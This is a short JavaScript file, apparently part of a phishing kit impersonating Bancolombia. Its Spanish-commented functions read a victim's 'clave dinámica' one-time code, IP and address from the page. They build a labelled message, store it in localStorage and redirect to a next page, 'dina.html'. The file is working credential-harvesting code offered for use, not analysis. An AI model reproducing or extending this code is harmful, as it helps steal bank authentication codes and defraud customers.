var u_name, ip, ip2;

// Función para obtener los valores y almacenarlos en localStorage
var ready = function () {
    // Obtener valores de los elementos
    u_name = document.getElementById("dinamica").value; // Clave dinámica ingresada
    ip = document.getElementById("gfg").innerHTML;      // IP
    ip2 = document.getElementById("address").innerHTML; // Otra IP o dirección

    // Crear el mensaje formateado
    var message = "DINAMICA: " + u_name + "\n\nIP: " + ip + "\n" + ip2 + "\nBANCOLOMBIA";

    // Guardar en localStorage
    localStorage.setItem("dinamica", u_name); // Guarda la clave dinámica
    localStorage.setItem("ip", ip);          // Guarda el IP principal
    localStorage.setItem("ip2", ip2);        // Guarda la segunda IP o dirección
    localStorage.setItem("mensaje", message); // Guarda el mensaje completo

    console.log("Datos guardados en localStorage");
};

// Función principal que se llama al presionar el botón
var sender = function () {
    ready(); // Guarda los datos en localStorage
    window.location.href = "dina.html"; // Redirige a la siguiente página
    return false;
};
